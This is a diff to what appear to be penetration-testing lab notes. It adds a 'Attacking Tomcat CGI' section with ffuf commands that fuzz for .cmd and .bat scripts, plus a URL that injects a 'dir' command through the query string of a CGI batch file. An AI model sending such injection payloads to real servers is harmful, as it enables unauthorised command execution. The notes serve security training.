@@ -107,3 +107,12 @@ gobuster dir -u https://target.com:8080 \
 
 gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
 ```
+
+# Attacking Tomcat CGI
+```powershell
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+
+http://10.129.204.227:8080/cgi/welcome.bat?&dir
+```
